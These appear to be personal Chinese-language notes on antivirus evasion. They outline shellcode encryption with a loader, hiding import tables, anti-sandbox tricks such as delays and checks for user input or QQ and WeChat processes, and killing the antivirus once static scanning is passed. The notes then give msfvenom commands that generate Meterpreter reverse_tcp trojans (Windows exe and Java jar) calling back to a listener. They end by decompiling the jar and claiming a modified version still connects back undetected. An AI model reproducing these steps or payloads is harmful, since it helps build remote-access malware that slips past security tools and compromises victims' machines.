## 杀软查杀规则
>if 应用 has 签名 then return
>else（投入和回报不成正比）
- 静态特征（国内）：
	- 加密shellcode + 垃圾代码 + 加载器 解密shellcode(静态特征转换成内存查杀，程序必须运行起来才可以加载shellcode)-->申请内存-->创建线程-->等待结束。
	- 加载器：IAT 导出表 当前exe调用的api
		- 替换函数
		- 隐藏导出表 import（不直接导入函数，使用内存寻址方式找到函数）
		- 反沙箱
			- 检查鼠标和键盘
			- 延迟10s
			- 检查进程qq 微信 wps
			- 堆栈溢出 让沙箱崩溃
			- 分离免杀（直接点击应用启动不了）
- 内存查杀（国外）（静态查杀一过第一件事情就是干掉杀软）
	- 内核态
	- 用户态
- 行为查杀



## 生成木马上线

```bash
msfvenom -p winodws/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=444 -f exe -o 123.exe

use exploit/multi/handler

```
## Meterpreter源码分析
[payload.zip](payload.zip)

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 > 1.jar
```
###  jd-jui反编译源码
1. `META-INF` :`MANIFEST.MF`  ![](media/Pasted%20image%2020250814222625.png)
2. 入口文件![](media/Pasted%20image%2020250814222819.png)  
3. 反编译： ![](media/Pasted%20image%2020250814222842.png)  
### 分析源码

[payload.zip](payload.zip)

1. 继承ClassLoader： 为了实现defineClass这个方法 ![](media/Pasted%20image%2020250814225352.png)  
	1. defineClass ：Java提供给开发者一个加载字节码的方法
2. 

### 修改源码依旧上线成功免杀



